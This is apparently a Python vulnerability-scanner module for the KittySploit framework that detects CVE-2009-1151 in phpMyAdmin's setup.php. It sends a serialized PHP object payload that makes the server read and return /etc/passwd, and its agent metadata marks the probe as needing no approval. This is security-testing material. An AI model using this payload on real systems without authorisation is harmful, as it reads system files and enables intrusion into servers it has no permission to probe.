#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PhpMyAdmin Scripts 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PhpMyAdmin Scripts - Remote Code Execution Detection',
        'description': 'PhpMyAdmin Scripts 2.11.x before 2.11.9.5 and 3.x before 3.1.3.1 are susceptible to a remote code execution in setup.php that allows remote attackers to inject arbitrary PHP code into a configuration file via the save action. Combined with the ability to save files on server, this can allow unauthenticated users to execute arbitrary PHP code.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2009', 'deserialization', 'kev', 'vulhub', 'phpmyadmin', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.phpmyadmin.net/security/PMASA-2009-3/',
            'https://github.com/vulhub/vulhub/tree/master/phpmyadmin/WooYun-2016-199433',
            'http://phpmyadmin.svn.sourceforge.net/viewvc/phpmyadmin/branches/MAINT_2_11_9/phpMyAdmin/scripts/setup.php?r1=11514&r2=12301&pathrev=12301',
            'http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php',
            'https://nvd.nist.gov/vuln/detail/CVE-2009-1151',
        ],
        'cve': 'CVE-2009-1151',
    }

    def run(self):
        path = '/scripts/setup.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}, data='action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='PhpMyAdmin Scripts - Remote Code Execution detected', path=path)
            return True
        return False

